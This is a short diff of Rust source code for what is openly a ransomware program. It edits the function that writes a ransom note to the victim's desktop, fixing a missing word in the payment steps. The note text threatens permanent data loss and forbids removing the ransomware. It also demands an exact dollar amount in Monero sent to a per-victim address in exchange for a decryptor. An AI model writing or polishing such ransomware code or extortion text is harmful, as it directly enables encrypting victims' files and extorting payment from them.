@@ -15,7 +15,7 @@ pub fn put_files_on_desktop_on_how_to_recover_data(
                         !!!THERE IS NO WAY FOR YOU TO RECOVER YOUR FILES IF YOU DON'T HAVE ACCESS TO THIS WINDOWS INSTALL, SO DON'T ATTEMPT ANYTHING!!!\n\
                         !!!THE RANSOMWARE NEEDS TO BE PRESENT IN ORDER FOR THE DECTRYPTOR TO WORK, -DON'T ATTEMPT TO REMOVE IT-!!!\n\n\
                         In order for you get the decryptor you need to follow this steps carefully, otherwise you will lose your money too:\n\
-                        1.Make a Monero wallet with their OFFICIAL WALLET APP and {money_amount_in_dollars}$ (dollars) to the wallet, duckduckgo how to do it if you don't know.\n\
+                        1.Make a Monero wallet with their OFFICIAL WALLET APP and add {money_amount_in_dollars}$ (dollars) to the wallet, duckduckgo how to do it if you don't know.\n\
                         2.Send {money_amount_in_dollars}$ (dollars), needs to be this exact amount, to this address (case sensitive):\n\
                         \t{monero_address}\n\
                         2.1 This address is specific to only your computer, so when we receive the money you will receive the decryptor exe on your desktop and an instruction file on how to use it.\n\
